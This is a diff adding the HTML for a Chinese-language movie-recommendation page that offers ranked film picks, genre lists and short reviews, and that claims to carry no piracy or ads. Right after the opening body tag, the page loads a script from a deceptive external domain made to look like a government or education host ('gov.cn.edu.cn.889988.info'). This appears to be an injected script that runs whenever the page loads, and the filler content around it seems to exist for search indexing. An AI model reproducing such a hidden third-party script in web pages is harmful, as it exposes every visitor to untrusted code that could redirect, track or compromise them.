@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>酷客电影网 - 硬核片单与影迷酷评指南</title>
+<meta name="description" content="酷客电影网(kukedianyingwang-h5)整理科幻、悬疑、邪典、作者电影等类型片单，提供影迷向酷评与选片指南，从《沙丘2》到《银翼杀手2049》，移动端自适应，必应收录友好。">
+<meta name="keywords" content="酷客电影网, 硬核片单, 影迷酷评, 科幻电影, 悬疑反转, 邪典神作, 冷门佳片, kukedianyingwang-h5">
+<meta name="author" content="酷客电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://kukedianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --term:#0d1117;
+  --term2:#161b22;
+  --term3:#21262d;
+  --neon:#58a6ff;
+  --purple:#bc8cff;
+  --green:#3fb950;
+  --orange:#f0a040;
+  --muted:#8b949e;
+  --line:rgba(88,166,255,.25);
+  --line2:rgba(188,140,255,.2);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"JetBrains Mono","Fira Code","Consolas","PingFang SC",monospace;
+  background:
+    radial-gradient(80% 50% at 50% -10%, rgba(88,166,255,.08), transparent 60%),
+    radial-gradient(60% 40% at 90% 10%, rgba(188,140,255,.06), transparent 60%),
+    linear-gradient(180deg,var(--term),#0a0e14 60%,#06090e 100%);
+  color:#c9d1d9;line-height:1.72;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 终端条 */
+.geek-bar{
+  background:linear-gradient(90deg,#06090e,var(--term2),#06090e);
+  color:var(--green);text-align:center;font-size:11px;letter-spacing:3px;
+  padding:6px 10px;font-weight:700;font-family:"JetBrains Mono",monospace;
+  border-bottom:1px solid var(--term3);
+}
+
+/* 头部 */
+.header{max-width:1120px;margin:0 auto;padding:28px 20px 16px;text-align:center}
+.terminal{
+  display:inline-flex;align-items:center;gap:14px;
+  padding:14px 26px;border-radius:8px;
+  background:rgba(88,166,255,.04);border:1px solid var(--line);
+  position:relative;
+}
+.terminal::after{
+  content:"酷";position:absolute;right:-10px;top:-10px;
+  width:26px;height:26px;border-radius:4px;
+  background:var(--neon);color:var(--term);
+  font-size:12px;display:flex;align-items:center;justify-content:center;font-weight:800;
+}
+.terminal .prompt{font-size:28px;color:var(--green)}
+.terminal h1{font-size:26px;letter-spacing:3px;color:#e6edf3;font-weight:800}
+.terminal .en{font-size:10px;color:var(--muted);letter-spacing:2px;text-align:left;font-family:"JetBrains Mono",monospace}
+.header p.slogan{margin-top:12px;color:#8b949e;font-size:13px;max-width:680px;margin-left:auto;margin-right:auto}
+.header p.slogan .hl{color:var(--neon)}
+
+/* 搜索 */
+.search-wrap{max-width:540px;margin:14px auto 0}
+.search-wrap form{display:flex;height:42px;border-radius:6px;overflow:hidden;border:1px solid var(--line);background:var(--term2)}
+.search-wrap input{flex:1;border:none;outline:none;background:transparent;padding:0 18px;font-size:13px;color:#e6edf3;font-family:"JetBrains Mono",monospace}
+.search-wrap input::placeholder{color:#484f58}
+.search-wrap button{border:none;background:var(--neon);color:var(--term);padding:0 20px;font-weight:800;cursor:pointer;letter-spacing:1px;font-family:"JetBrains Mono",monospace}
+
+/* 导航 */
+.nav{max-width:1120px;margin:18px auto 22px;padding:0 20px;display:flex;gap:8px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:7px 16px;border:1px solid var(--term3);border-radius:4px;font-size:12px;color:#8b949e;background:var(--term2);font-family:"JetBrains Mono",monospace;transition:all .2s}
+.nav a:hover,.nav a.active{background:var(--neon);color:var(--term);border-color:var(--neon);font-weight:800}
+
+/* 主区 */
+.main{max-width:1120px;margin:0 auto;padding:0 20px 30px}
+
+/* 卷首 */
+.geek-board{
+  position:relative;overflow:hidden;
+  background:linear-gradient(135deg,#06090e,var(--term2));
+  color:#c9d1d9;border-left:4px solid var(--neon);
+  border-radius:8px;padding:28px 26px;margin-bottom:28px;
+  border:1px solid var(--term3);border-left:4px solid var(--neon);
+}
+.geek-board::after{content:"🎬";position:absolute;right:20px;bottom:-10px;font-size:120px;opacity:.06}
+.geek-board .kicker{font-size:11px;color:var(--green);letter-spacing:3px;font-family:"JetBrains Mono",monospace}
+.geek-board h2{font-size:24px;margin:6px 0 10px;color:#e6edf3;letter-spacing:1px}
+.geek-board p{color:#8b949e;max-width:640px;font-size:13px}
+.geek-board .tags{margin-top:14px;display:flex;gap:8px;flex-wrap:wrap}
+.geek-board .tags span{padding:4px 12px;border:1px solid var(--line);border-radius:3px;font-size:11px;color:var(--neon);font-family:"JetBrains Mono",monospace}
+
+/* 栏目头 */
+.section{margin-bottom:30px}
+.s-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;border-bottom:1px solid var(--term3);padding-bottom:8px}
+.s-head .hash{
+  font-size:16px;color:var(--green);font-family:"JetBrains Mono",monospace;font-weight:800;
+}
+.s-head h3{font-size:17px;letter-spacing:1px;color:#e6edf3;font-weight:800}
+.s-head .more{margin-left:auto;font-size:11px;color:var(--neon);font-family:"JetBrains Mono",monospace}
+
+/* 栏目一：酷客硬核榜 */
+.coolpick-row{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.coolpick-card{
+  background:var(--term2);border:1px solid var(--term3);
+  border-top:3px solid var(--neon);
+  border-radius:6px;padding:18px;transition:all .3s;
+}
+.coolpick-card:hover{transform:translateY(-3px);border-color:var(--line);box-shadow:0 6px 20px rgba(88,166,255,.08)}
+.coolpick-card .rank{font-size:10px;color:var(--muted);font-family:"JetBrains Mono",monospace;margin-bottom:4px}
+.coolpick-card h4{font-size:16px;margin-bottom:4px;color:#e6edf3;letter-spacing:.5px}
+.coolpick-card .meta{font-size:11px;color:var(--muted);font-family:"JetBrains Mono",monospace;margin-bottom:8px}
+.coolpick-card p{font-size:12px;color:#8b949e;line-height:1.6}
+.coolpick-card .chip{margin-top:10px;display:inline-block;font-size:10px;color:var(--neon);border:1px solid var(--line);padding:2px 10px;border-radius:3px;font-family:"JetBrains Mono",monospace}
+
+/* 栏目二：类型片单 */
+.type-list{background:var(--term2);border:1px solid var(--term3);border-radius:6px;overflow:hidden}
+.type-row{display:flex;gap:14px;padding:14px 16px;border-bottom:1px solid var(--term3);align-items:flex-start}
+.type-row:last-child{border-bottom:none}
+.type-icon{width:40px;height:40px;border-radius:6px;background:var(--purple);color:var(--term);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.type-row:nth-child(2) .type-icon{background:var(--green)}
+.type-row:nth-child(3) .type-icon{background:var(--orange)}
+.type-row:nth-child(4) .type-icon{background:var(--neon)}
+.type-row:nth-child(5) .type-icon{background:#f06090}
+.type-info{flex:1}
+.type-info h4{font-size:15px;color:#e6edf3;letter-spacing:.5px}
+.type-info p{font-size:11px;color:#8b949e;margin-top:2px;line-height:1.5}
+.type-tag{font-size:10px;color:var(--purple);border:1px solid var(--line2);padding:3px 10px;border-radius:3px;white-space:nowrap;font-family:"JetBrains Mono",monospace}
+
+/* 栏目三：酷客酷评 */
+.neon-grid{display:flex;gap:14px;overflow-x:auto;padding-bottom:10px;scroll-snap-type:x mandatory}
+.neon-card{scroll-snap-align:start;flex:0 0 220px;background:var(--term2);border:1px solid var(--term3);border-radius:6px;overflow:hidden}
+.neon-top{height:72px;display:flex;align-items:center;justify-content:center;font-size:32px;background:linear-gradient(135deg,var(--term),var(--term3))}
+.neon-card:nth-child(2) .neon-top{background:linear-gradient(135deg,#1a1a2e,#16213e)}
+.neon-card:nth-child(3) .neon-top{background:linear-gradient(135deg,#0d1117,#1a1a2e)}
+.neon-card:nth-child(4) .neon-top{background:linear-gradient(135deg,#161b22,#0d1117)}
+.neon-card:nth-child(5) .neon-top{background:linear-gradient(135deg,#1a1a2e,#0d1117)}
+.neon-body{padding:12px}
+.neon-body h4{font-size:14px;color:#e6edf3;margin-bottom:4px}
+.neon-body .score{font-size:20px;font-weight:800;color:var(--orange);font-family:"JetBrains Mono",monospace}
+.neon-body p{font-size:11px;color:#8b949e;line-height:1.5;margin-top:4px}
+
+/* 栏目四：影迷工具 */
+.tool-row{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.tool-card{
+  background:var(--term2);border:1px solid var(--term3);
+  border-left:3px solid var(--green);
+  border-radius:6px;padding:16px;
+}
+.tool-card h4{font-size:15px;color:#e6edf3;margin-bottom:4px}
+.tool-card .meta{font-size:11px;color:var(--muted);font-family:"JetBrains Mono",monospace;margin-bottom:6px}
+.tool-card p{font-size:12px;color:#8b949e;line-height:1.6}
+
+/* 栏目五：关于 */
+.about{background:var(--term2);color:#8b949e;border:1px solid var(--term3);border-radius:8px;padding:24px;display:flex;gap:18px;align-items:flex-start;flex-wrap:wrap}
+.about .ico{font-size:36px}
+.about h3{font-size:16px;color:var(--neon);margin-bottom:8px;letter-spacing:1px}
+.about p{font-size:12px;color:#8b949e;max-width:660px;line-height:1.7}
+.about .url{margin-top:8px;font-family:"JetBrains Mono",monospace;font-size:11px;color:var(--neon)}
+
+/* 页脚 */
+.footer{margin-top:30px;border-top:1px solid var(--term3);padding:24px 20px 36px;text-align:center;color:#484f58;font-size:11px;font-family:"JetBrains Mono",monospace}
+.footer a{color:#8b949e}
+.footer .fn{margin-top:12px;display:flex;justify-content:center;gap:16px;flex-wrap:wrap}
+.footer .fn a{color:#484f58}
+.footer .fn a:hover{color:#e6edf3}
+
+@media(max-width:860px){.coolpick-row{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:640px){
+  .terminal h1{font-size:20px}
+  .terminal .prompt{font-size:24px}
+  .nav a{padding:5px 12px;font-size:11px}
+  .geek-board{padding:20px 16px}
+  .geek-board h2{font-size:19px}
+  .main{padding:0 14px 20px}
+  .coolpick-row{grid-template-columns:1fr}
+  .tool-row{grid-template-columns:1fr}
+  .type-row{flex-wrap:wrap;gap:10px}
+  .type-tag{margin-left:0}
+  .neon-card{flex-basis:80%}
+  .about{padding:16px 14px}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="geek-bar">$ 酷客电影网 · 硬核片单 / 影迷酷评 / 类型指南 · 单页自适应 · 必应收录友好</div>
+
+<header class="header">
+  <div class="terminal">
+    <div class="prompt">▶</div>
+    <div>
+      <h1>酷客电影网</h1>
+      <div class="en">kukedianyingwang-h5 · Geek Cinema Guide</div>
+    </div>
+  </div>
+  <p class="slogan">不是"酷客影院"、不是"免费解析站"。<span class="hl">酷客电影网</span>只做影迷向选片指南——硬核片单、类型分类、酷评打分，帮你看对片、不踩雷。</p>
+  <div class="search-wrap">
+    <form action="#" method="get">
+      <input type="text" name="q" placeholder="搜 科幻 / 悬疑 / 邪典 / 作者电影 / 冷门佳片...">
+      <button type="submit">酷搜</button>
+    </form>
+  </div>
+</header>
+
+<nav class="nav">
+  <a href="#" class="active">首页</a>
+  <a href="#">硬核榜</a>
+  <a href="#">类型片单</a>
+  <a href="#">酷客酷评</a>
+  <a href="#">影迷工具</a>
+  <a href="#">关于酷客</a>
+</nav>
+
+<div class="main">
+
+  <section class="geek-board">
+    <div class="kicker">◆ SELECT · REVIEW · GUIDE ◆</div>
+    <h2>选片不踩雷，酷客帮你挑</h2>
+    <p>酷客电影网是影迷向选片站——不做免费在线播放、不挂解析线路、不弹窗广告。我们做的事：从海量片库里帮你筛出值得看的好片，按类型分类、写酷评、打分数、标雷点。单页静态、移动端自适应、内页 # 占位。</p>
+    <div class="tags">
+      <span>科幻史诗</span><span>悬疑反转</span><span>邪典神作</span><span>作者电影</span><span>冷门佳片</span>
+    </div>
+  </section>
+
+  <!-- 栏目一 -->
+  <section class="section" id="top">
+    <div class="s-head"><span class="hash">#</span><h3>酷客硬核榜</h3><a class="more" href="#">全部 #</a></div>
+    <div class="coolpick-row">
+      <article class="coolpick-card">
+        <div class="rank">RANK 01</div>
+        <h4>《沙丘2》</h4>
+        <div class="meta">2024 · Denis Villeneuve · Sci-Fi</div>
+        <p>维伦纽瓦用IMAX摄影机把弗兰克·赫伯特的史诗搬上银幕。沙漠巨虫、香料政治、保罗的弥赛亚之路——视听震撼与哲学深度并存。</p>
+        <span class="chip"># 科幻史诗</span>
+      </article>
+      <article class="coolpick-card">
+        <div class="rank">RANK 02</div>
+        <h4>《奥本海默》</h4>
+        <div class="meta">2023 · Christopher Nolan · Biopic</div>
+        <p>诺兰首次拍传记，用IMAX 65mm胶片拍出了原子弹诞生时的道德眩晕。三段时间线交叉剪辑，最后20分钟没有爆炸却比任何爆炸都震撼。</p>
+        <span class="chip"># 传记神作</span>
+      </article>
+      <article class="coolpick-card">
+        <div class="rank">RANK 03</div>
+        <h4>《周处除三害》</h4>
+        <div class="meta">2023 · 黄精甫 · 台湾</div>
+        <p>通缉犯陈桂林发现自己只剩半年寿命，决定干掉排行榜前两名再自首。台湾黑帮片复兴，阮经天贡献职业生涯最佳表演。</p>
+        <span class="chip"># 黑帮动作</span>
+      </article>
+      <article class="coolpick-card">
+        <div class="rank">RANK 04</div>
+        <h4>《降临》</h4>
+        <div class="meta">2016 · Denis Villeneuve · Sci-Fi</div>
+        <p>外星飞船降临地球，语言学家露易丝试图破译七肢桶的文字。时间非线性、萨丕尔-沃尔夫假说——科幻片拍出了诗意与宿命感。</p>
+        <span class="chip"># 语言学科幻</span>
+      </article>
+      <article class="coolpick-card">
+        <div class="rank">RANK 05</div>
+        <h4>《银翼杀手2049》</h4>
+        <div class="meta">2017 · Denis Villeneuve · Sci-Fi</div>
+        <p>高司令饰演的K在追查一个秘密的过程中质疑自己的身份。德尼·维伦纽瓦和罗杰·迪金斯联手创造了影史最震撼的视觉奇观之一。</p>
+        <span class="chip"># 赛博朋克</span>
+      </article>
+      <article class="coolpick-card">
+        <div class="rank">RANK 06</div>
+        <h4>《寄生虫》</h4>
+        <div class="meta">2019 · 奉俊昊 · 韩国</div>
+        <p>穷人一家靠伪造简历进入富人家庭工作，秘密逐渐暴露。奥斯卡最佳影片，奉俊昊用类型片外壳讲阶级寓言，结尾那场雨洗不掉贫穷。</p>
+        <span class="chip"># 阶级寓言</span>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section class="section" id="genre">
+    <div class="s-head"><span class="hash">#</span><h3>类型片单</h3><a class="more" href="#">完整 #</a></div>
+    <div class="type-list">
+      <div class="type-row">
+        <div class="type-icon">🚀</div>
+        <div class="type-info"><h4>科幻史诗</h4><p>《2001太空漫游》《星际穿越》《降临》《沙丘》《银翼杀手2049》——从库布里克到诺兰到维伦纽瓦，科幻片的哲学进化史。</p></div>
+        <div class="type-tag">12部</div>
+      </div>
+      <div class="type-row">
+        <div class="type-icon">🌀</div>
+        <div class="type-info"><h4>悬疑反转</h4><p>《看不见的客人》《利刃出鞘》《消失的爱人》《记忆碎片》《穆赫兰道》——每一部都在挑战你的推理极限。</p></div>
+        <div class="type-tag">15部</div>
+      </div>
+      <div class="type-row">
+        <div class="type-icon">🎭</div>
+        <div class="type-info"><h4>邪典神作</h4><p>《低俗小说》《发条橙》《狗镇》《圣山》《橡皮头》——挑战主流审美的另类经典，看懂了就是圈内人。</p></div>
+        <div class="type-tag">10部</div>
+      </div>
+      <div class="type-row">
+        <div class="type-icon">🎨</div>
+        <div class="type-info"><h4>作者电影</h4><p>塔可夫斯基、伯格曼、小津安二郎、侯孝贤、阿彼察邦——用个人风格重塑电影语言的导演谱系。</p></div>
+        <div class="type-tag">18部</div>
+      </div>
+      <div class="type-row">
+        <div class="type-icon">💎</div>
+        <div class="type-info"><h4>冷门佳片</h4><p>《完美的世界》《心灵奇旅》《海街日记》《小森林》《横道世之介》——没进院线但值得反复看的宝藏电影。</p></div>
+        <div class="type-tag">20部</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section class="section" id="review">
+    <div class="s-head"><span class="hash">#</span><h3>酷客酷评</h3><a class="more" href="#">更多 #</a></div>
+    <div class="neon-grid">
+      <div class="neon-card"><div class="neon-top">🎬</div><div class="neon-body"><h4>《坠落的审判》</h4><div class="score">8.7</div><p>桑德拉·惠勒的表演撑起整部电影。法庭戏拍成了婚姻解剖课，谁在说谎？也许真相根本不重要。</p></div></div>
+      <div class="neon-card"><div class="neon-top">🔪</div><div class="neon-body"><h4>《利益区域》</h4><div class="score">8.3</div><p>奥斯维辛集中营隔壁，一家人的日常。用最平静的镜头拍最恐怖的事。最佳音效设计实至名归。</p></div></div>
+      <div class="neon-card"><div class="neon-top">🌊</div><div class="neon-body"><h4>《奥本海默》</h4><div class="score">9.1</div><p>诺兰的巅峰。三段时间线交织，最后20分钟没有爆炸却让人窒息。基里安·墨菲的眼神值一座小金人。</p></div></div>
+      <div class="neon-card"><div class="neon-top">🐉</div><div class="neon-body"><h4>《沙丘2》</h4><div class="score">8.8</div><p>维伦纽瓦把沙漠拍成了角色。保罗的弥赛亚之路充满宿命感，汉斯·季默的配乐是另一种叙事。</p></div></div>
+      <div class="neon-card"><div class="neon-top">🏠</div><div class="neon-body"><h4>《坠落的审判》</h4><div class="score">8.5</div><p>婚姻里的每一句话都是证据。法国导演茹斯汀·特里耶用冷静的镜头拆解亲密关系中的权力博弈。</p></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section class="section" id="tools">
+    <div class="s-head"><span class="hash">#</span><h3>影迷工具</h3><a class="more" href="#">完整 #</a></div>
+    <div class="tool-row">
+      <article class="tool-card">
+        <h4>导演谱系图</h4>
+        <div class="meta">谱系 · 师承 · 影响</div>
+        <p>从黑泽明到斯皮尔伯格到诺兰，从塔可夫斯基到维伦纽瓦——用谱系图看懂导演之间的师承与影响关系。</p>
+      </article>
+      <article class="tool-card">
+        <h4>观影顺序指南</h4>
+        <div class="meta">漫威 / DC / 星际迷航 / 指环王</div>
+        <p>漫威电影宇宙按时间线还是按上映顺序？DC重启后怎么补？帮你理清每个系列的观影路径。</p>
+      </article>
+      <article class="tool-card">
+        <h4>彩蛋与细节解析</h4>
+        <div class="meta">隐藏细节 / 致敬 / 伏笔</div>
+        <p>《头号玩家》里有多少个彩蛋？《疯狂的麦克斯4》为什么全程没有CGI？深度解析电影里的隐藏信息。</p>
+      </article>
+      <article class="tool-card">
+        <h4>片单生成器</h4>
+        <div class="meta">按心情 / 按类型 / 按时长</div>
+        <p>心情不好想看治愈片？周末想刷悬疑？只有1小时空闲？输入条件，酷客帮你生成专属片单。</p>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目五 -->
+  <section class="section" id="about">
+    <div class="s-head"><span class="hash">#</span><h3>关于酷客电影网</h3></div>
+    <div class="about">
+      <div class="ico">▶</div>
+      <div>
+        <h3>不是"酷客影院"，是影迷选片指南</h3>
+        <p>酷客电影网（kukedianyingwang-h5）只做影迷向选片与酷评，不做免费在线播放、不挂解析线路、不弹窗广告、不提供盗版下载。网上"酷客影视/酷客影院"多为盗版聚合站，本站不继承其模式。我们做的事：帮你看对片、不踩雷。</p>
+        <div class="url">https://kukedianyingwang-h5.github.io</div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div>© 2026 酷客电影网 | kukedianyingwang-h5</div>
+  <div>永久地址：<a href="https://kukedianyingwang-h5.github.io">https://kukedianyingwang-h5.github.io</a></div>
+  <div>本站为影迷向选片指南与酷评站，不提供盗版播放或解析服务。</div>
+  <div class="fn">
+    <a href="#">首页</a><a href="#">硬核榜</a><a href="#">类型片单</a><a href="#">酷客酷评</a><a href="#">影迷工具</a><a href="#">关于</a>
+  </div>
+</footer>
+
+</body>
+</html>
